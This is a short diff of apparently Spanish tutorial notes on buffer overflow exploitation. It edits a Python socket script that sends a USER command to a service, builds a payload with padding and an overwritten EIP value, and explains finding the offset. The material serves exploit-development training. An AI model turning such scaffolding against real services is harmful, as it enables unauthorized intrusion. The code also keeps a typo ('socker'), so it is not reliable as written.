@@ -26,12 +26,12 @@ if len(sys.argv) != 2:
 
 def exploit():
 	s = socket.socket(socket.AF_INET, socker.SOCK_STREAM)
-	s.connect(())
+	s.connect((ip_address, port))
 	banner = s.recv(1024)
 	print(banner)
 	
-	s.send(B"USER savitar"+b'\r\n')
-	formato bytes
+	s.send(b"USER savitar"+ b'\r\n')
+	# b formato bytes
 	response = s.recv(1024)
 	print(response)
 	
@@ -60,4 +60,4 @@ eip = b"42"*4
 payload = before_eip + eip
 ```
 
-- De esa forma descubrimos el offset y lo que sigue es ver una vez que desbordamos ese buffer EIP hacia donde se redirigen los proximos bits.
+- De esa forma descubrimos el `offset` y lo que sigue es ver una vez que desbordamos ese buffer EIP hacia donde se redirigen los proximos bits.
